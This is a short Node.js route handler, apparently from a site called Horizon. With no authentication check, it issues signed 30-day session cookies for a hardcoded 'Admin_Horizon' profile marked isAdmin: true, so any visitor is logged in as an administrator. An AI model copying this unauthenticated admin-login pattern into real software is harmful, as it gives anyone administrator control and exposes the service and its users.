const { signData } = require('../_auth');

module.exports = (req, res) => {
  const profile = {
    steamId: '76561198737554294',
    steamid: '76561198737554294',
    name: 'Admin_Horizon',
    avatar: 'https://avatars.fastly.steamstatic.com/c5ff599f01c1c6496dbb96cc4321283e0b2cd8fd_full.jpg',
    level: 50,
    isAdmin: true
  };

  const userJson = JSON.stringify(profile);
  const sig = signData(userJson);

  res.setHeader('Set-Cookie', [
    `horizon_user=${encodeURIComponent(userJson)}; Path=/; Max-Age=2592000; SameSite=Lax`,
    `horizon_sig=${sig}; Path=/; Max-Age=2592000; SameSite=Lax; HttpOnly`
  ]);

  res.writeHead(302, { Location: '/feed?login=success_admin' });
  res.end();
};
